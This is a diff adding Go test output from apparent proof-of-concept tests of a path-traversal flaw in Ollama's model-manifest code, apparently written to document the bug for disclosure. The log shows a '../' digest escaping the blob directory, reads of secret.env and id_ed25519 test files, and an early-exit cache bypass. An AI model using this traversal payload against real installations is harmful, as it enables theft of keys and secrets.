@@ -1,0 +1,24 @@
+=== RUN   TestPoC_BlobPath_ResolvesOutsideBlobDir
+=== RUN   TestPoC_BlobPath_ResolvesOutsideBlobDir/control:_valid_sha256_digest_stays_inside_BlobDir
+    poc_test.go:48: BlobPath("sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa") -> "/tmp/TestPoC_BlobPath_ResolvesOutsideBlobDir1984012053/001/blobs/sha256-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+=== RUN   TestPoC_BlobPath_ResolvesOutsideBlobDir/BUG:_traversal_digest_escapes_BlobDir_to_sibling_file
+    poc_test.go:48: BlobPath("sha256:../../../leaked.txt") -> "/tmp/TestPoC_BlobPath_ResolvesOutsideBlobDir1984012053/001/leaked.txt"
+--- PASS: TestPoC_BlobPath_ResolvesOutsideBlobDir (0.00s)
+    --- PASS: TestPoC_BlobPath_ResolvesOutsideBlobDir/control:_valid_sha256_digest_stays_inside_BlobDir (0.00s)
+    --- PASS: TestPoC_BlobPath_ResolvesOutsideBlobDir/BUG:_traversal_digest_escapes_BlobDir_to_sibling_file (0.00s)
+=== RUN   TestPoC_ReadConfig_LFI_ViaTraversalDigest
+    poc_test.go:91: LFI confirmed: ReadConfig leaked 48 bytes from /tmp/TestPoC_ReadConfig_LFI_ViaTraversalDigest2108492870/001/secret.env via traversal digest
+--- PASS: TestPoC_ReadConfig_LFI_ViaTraversalDigest (0.00s)
+=== RUN   TestPoC_OpenBlob_LFI_ViaTraversalDigest
+    poc_test.go:123: LFI confirmed: OpenBlob leaked 42 bytes from /tmp/TestPoC_OpenBlob_LFI_ViaTraversalDigest1558027014/001/id_ed25519 via traversal digest
+--- PASS: TestPoC_OpenBlob_LFI_ViaTraversalDigest (0.00s)
+PASS
+ok  	github.com/ollama/ollama/x/imagegen/manifest
+=== RUN   TestPoC_Download_EarlyExitCacheBypass_AcceptsTraversalDigest
+    poc_test.go:49: Early-exit cache bypass confirmed: traversal digest accepted, no HTTP request made, malicious 'blob' considered downloaded → manifest commit would proceed.
+--- PASS: TestPoC_Download_EarlyExitCacheBypass_AcceptsTraversalDigest (0.00s)
+=== RUN   TestPoC_Download_EarlyExitChainEndState
+    poc_test.go:99: Confirmed: 2 traversal digests accepted, 0 HTTP requests, destDir empty. In a real pull flow, the manifest containing these digests would now be committed to disk by pullWithTransfer.
+--- PASS: TestPoC_Download_EarlyExitChainEndState (0.00s)
+PASS
+ok  	github.com/ollama/ollama/x/imagegen/transfer
